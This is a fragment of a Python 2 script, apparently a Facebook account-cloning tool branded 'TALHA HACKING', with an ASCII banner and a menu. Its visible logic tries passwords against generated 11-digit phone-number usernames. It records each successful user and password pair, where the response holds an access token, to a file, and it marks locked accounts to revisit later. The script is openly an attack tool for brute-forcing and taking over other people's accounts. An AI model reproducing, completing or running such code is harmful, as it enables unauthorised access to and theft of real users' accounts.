...
os.system('clear')
psb('\x1b[1;32mBANGLADESH TALHA HACKING 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
logo = '\n|  _____ _   _    _  _   _     _  _   _   ___ _  _____ _  _  ___  
 |\n|_   _/_\ | |  | || | /_\   | || | /_\ / __| |/ /_ _| \| |/ __| \n|..| |/ _ \| |__| __ |/ _ \  | __ |/ _ \ (__| ' < | || .` | (_ | \n|....#|_/_/ \_\____|_||_/_/ \_\ |_||_/_/ \_\___|_|\_\___|_|\_|\___| 
                                                                 \n|....##....#########.##.......##.....##.#########'
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : TALHA HACKING'
    print 'FACEBOOK : ABU TALHA'
    print 'GITHUB     : github.com/ABUTALHA'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Talha HACKING-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Talha HACKING-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
